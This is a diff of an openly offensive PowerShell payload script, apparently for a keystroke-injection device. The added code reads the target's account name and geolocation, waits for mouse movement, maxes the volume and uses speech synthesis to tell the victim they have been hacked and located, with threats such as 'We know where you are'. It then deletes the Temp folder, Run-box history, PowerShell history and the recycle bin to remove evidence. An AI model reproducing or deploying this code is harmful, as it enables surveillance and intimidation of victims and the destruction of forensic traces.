@@ -1,4 +1,25 @@
-$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+<#
+.NOTES
+	The target's Location Services must be turned on or this payload will not work.
+
+.SYNOPSIS
+	This script will get the user's location and open a map of where they are in their browser and use Windows speech to declare you know where they are.  
+
+.DESCRIPTION 
+	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with their Microsoft account.
+	The SSID and WiFi password of any current or previously connected to networks.
+	It determines the last day they changed their password and how many days ago.
+	Once the information is gathered, the script will pause until a mouse movement is detected.
+	Then the script uses Sapi speak to roast their set up and lack of security.
+#>
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to get the name associated with the targets Microsoft account, if not detected UserName will be used. 
+#>
 
 function Get-fullName {
 
@@ -22,6 +43,47 @@ function Get-fullName {
 
 $FN = Get-fullName
 
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to get the current Latitude and Longitude of your target
+#>
+
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current locaton
+
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
+
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
+		
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
+
+}
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to pause the script until a mouse movement is detected
+#>
+
 function Pause-Script{
 Add-Type -AssemblyName System.Windows.Forms
 $originalPOS = [System.Windows.Forms.Cursor]::Position.X
@@ -38,17 +100,66 @@ $o=New-Object -ComObject WScript.Shell
     }
 }
 
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$GL = Get-GeoLocation
+
+$GL = $GL -split " "
+
+$Lat = $GL[0].Substring(11) -replace ".$"
+
+$Lon = $GL[1].Substring(10) -replace ".$"
+
 Pause-Script
 
+# Sets Volume to max level
+
+$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+
+# Sets up speech module 
+
 $s=New-Object -ComObject SAPI.SpVoice
-$s.Rate = -1
-$s.Speak("We found you $FN")
+$s.Rate = -2
+$s.Speak("You have been hacked by UnknownBlackHat $FN")
+
+# Opens signature video
+
 Start-Process "https://www.dropbox.com/s/lsp5v2jrkzud3sd/signature.FucSocy.mov?dl=0"
-$pauseTime = 2
-$s.Speak("Your computer has been hacked by Unknown Black Hat.")
-$s.Speak("We know all about you $FN, so there is no where to go or hide")
-$s.Speak("I have control over all your files, passwords, Etcetera")
-$s.Speak("We are F Society. We are Free. We are one.")
-$s.Speak("No need for a computer restart since im already in the system for good, but you can try.")
-$s.Speak("Remember, we know who you are $fn, and we can see you.")
-$s.Speak("Expect me.")
+
+Start-Sleep -s 3
+
+# Sets up speech module 
+
+$s=New-Object -ComObject SAPI.SpVoice
+$s.Rate = -2
+$s.Speak("We found you $FN")
+$s.Speak("We know where you are")
+$s.Speak("We already have infiltrated your privacy and personal life.")
+$s.Speak("We are everywhere")
+$s.Speak("We do not forgive, we do not forget")
+$s.Speak("Expect us. Fuck Society")
+
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
